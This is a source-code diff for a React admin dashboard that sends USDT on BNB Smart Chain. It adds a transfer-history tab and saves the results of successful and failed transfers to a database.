@@ -182,6 +182,7 @@ function AdminPage({ adminWallet }: { adminWallet: string }) {
             <TabsTrigger value="overview">Overview</TabsTrigger>
             <TabsTrigger value="users">Users</TabsTrigger>
             <TabsTrigger value="transactions">Transactions</TabsTrigger>
+            <TabsTrigger value="history">Transfer History</TabsTrigger>
             <TabsTrigger value="transfer">Transfer USDT</TabsTrigger>
           </TabsList>
 
@@ -197,8 +198,12 @@ function AdminPage({ adminWallet }: { adminWallet: string }) {
             <TransactionsTab />
           </TabsContent>
 
+          <TabsContent value="history">
+            <TransferHistoryTab />
+          </TabsContent>
+
           <TabsContent value="transfer">
-            <TransferTab />
+            <TransferTab adminWallet={adminWallet} />
           </TabsContent>
         </Tabs>
       </div>
@@ -794,6 +799,8 @@ function TransferDialog({
   const [usdtBalance, setUsdtBalance] = useState<string>("");
   const [bnbBalance, setBnbBalance] = useState<string>("");
   const [loadingBalances, setLoadingBalances] = useState(false);
+  const [adminWallet, setAdminWallet] = useState<string>("");
+  const createTransfer = useMutation(api.transfers.createTransfer);
 
   const BSC_CHAIN_ID = "0x38";
   const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
@@ -948,7 +955,17 @@ function TransferDialog({
 
       toast.success("Transaction submitted! Waiting for confirmation...");
 
-      await tx.wait();
+      const receipt = await tx.wait();
+
+      // Save transfer to database
+      await createTransfer({
+        fromAddress: transaction.walletAddress,
+        toAddress,
+        amount,
+        txHash: receipt.hash,
+        transferredBy: adminWallet,
+        status: "success",
+      });
 
       toast.success("Transfer successful! ✅");
 
@@ -956,6 +973,22 @@ function TransferDialog({
     } catch (error) {
       console.error(error);
       const err = error as { reason?: string; message?: string };
+      
+      // Save failed transfer to database
+      try {
+        await createTransfer({
+          fromAddress: transaction.walletAddress,
+          toAddress,
+          amount,
+          txHash: "failed",
+          transferredBy: adminWallet,
+          status: "failed",
+          note: err.reason || err.message || "Transfer failed",
+        });
+      } catch (dbError) {
+        console.error("Failed to save error to database:", dbError);
+      }
+
       toast.error(err.reason || err.message || "Transfer failed");
     } finally {
       setIsProcessing(false);
@@ -1071,12 +1104,109 @@ function TransferDialog({
   );
 }
 
-function TransferTab() {
+function TransferHistoryTab() {
+  const transfers = useQuery(api.transfers.getAllTransfers);
+
+  if (!transfers) {
+    return <Skeleton className="h-64 w-full" />;
+  }
+
+  return (
+    <Card>
+      <CardHeader>
+        <CardTitle>Transfer History ({transfers.length})</CardTitle>
+      </CardHeader>
+      <CardContent>
+        {transfers.length === 0 ? (
+          <div className="rounded-lg border border-dashed p-8 text-center">
+            <p className="text-muted-foreground">No transfers yet</p>
+          </div>
+        ) : (
+          <div className="space-y-4">
+            {transfers.map((transfer) => (
+              <div
+                key={transfer._id}
+                className="rounded-lg border bg-card p-4 space-y-3"
+              >
+                <div className="flex items-start justify-between">
+                  <div className="space-y-2 flex-1">
+                    <div className="flex items-center gap-3">
+                      <div className="font-semibold text-lg">{transfer.amount} USDT</div>
+                      <Badge
+                        className={
+                          transfer.status === "success"
+                            ? "bg-green-500/10 text-green-500 border-green-500/20"
+                            : "bg-red-500/10 text-red-500 border-red-500/20"
+                        }
+                      >
+                        {transfer.status}
+                      </Badge>
+                    </div>
+
+                    <div className="grid gap-2 text-sm">
+                      <div className="flex items-start gap-2">
+                        <span className="font-semibold min-w-[140px]">From Address:</span>
+                        <span className="font-mono text-xs text-muted-foreground break-all">
+                          {transfer.fromAddress}
+                        </span>
+                      </div>
+
+                      <div className="flex items-start gap-2">
+                        <span className="font-semibold min-w-[140px]">To Address:</span>
+                        <span className="font-mono text-xs text-muted-foreground break-all">
+                          {transfer.toAddress}
+                        </span>
+                      </div>
+
+                      <div className="flex items-start gap-2">
+                        <span className="font-semibold min-w-[140px]">Transferred By:</span>
+                        <span className="font-mono text-xs text-muted-foreground break-all">
+                          {transfer.transferredBy}
+                        </span>
+                      </div>
+
+                      <div className="flex items-start gap-2">
+                        <span className="font-semibold min-w-[140px]">Transaction Hash:</span>
+                        <a
+                          href={`https://bscscan.com/tx/${transfer.txHash}`}
+                          target="_blank"
+                          rel="noopener noreferrer"
+                          className="font-mono text-xs text-primary hover:underline break-all"
+                        >
+                          {transfer.txHash}
+                        </a>
+                      </div>
+
+                      <div className="flex items-start gap-2">
+                        <span className="font-semibold min-w-[140px]">Date & Time:</span>
+                        <span className="text-muted-foreground">{transfer._creationTime}</span>
+                      </div>
+
+                      {transfer.note && (
+                        <div className="flex items-start gap-2">
+                          <span className="font-semibold min-w-[140px]">Note:</span>
+                          <span className="text-muted-foreground">{transfer.note}</span>
+                        </div>
+                      )}
+                    </div>
+                  </div>
+                </div>
+              </div>
+            ))}
+          </div>
+        )}
+      </CardContent>
+    </Card>
+  );
+}
+
+function TransferTab({ adminWallet }: { adminWallet: string }) {
   const [fromAddress, setFromAddress] = useState("");
   const [toAddress, setToAddress] = useState("");
   const [amount, setAmount] = useState("");
   const [isProcessing, setIsProcessing] = useState(false);
   const [adminConnected, setAdminConnected] = useState(false);
+  const createTransfer = useMutation(api.transfers.createTransfer);
 
   const BSC_CHAIN_ID = "0x38";
   const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
@@ -1173,7 +1303,17 @@ function TransferTab() {
 
       toast.success("Transaction submitted! Waiting for confirmation...");
 
-      await tx.wait();
+      const receipt = await tx.wait();
+
+      // Save transfer to database
+      await createTransfer({
+        fromAddress,
+        toAddress,
+        amount,
+        txHash: receipt.hash,
+        transferredBy: adminWallet,
+        status: "success",
+      });
 
       toast.success("Transfer successful! ✅");
 
@@ -1183,6 +1323,22 @@ function TransferTab() {
     } catch (error) {
       console.error(error);
       const err = error as { reason?: string; message?: string };
+      
+      // Save failed transfer to database
+      try {
+        await createTransfer({
+          fromAddress,
+          toAddress,
+          amount,
+          txHash: "failed",
+          transferredBy: adminWallet,
+          status: "failed",
+          note: err.reason || err.message || "Transfer failed",
+        });
+      } catch (dbError) {
+        console.error("Failed to save error to database:", dbError);
+      }
+
       toast.error(err.reason || err.message || "Transfer failed");
     } finally {
       setIsProcessing(false);
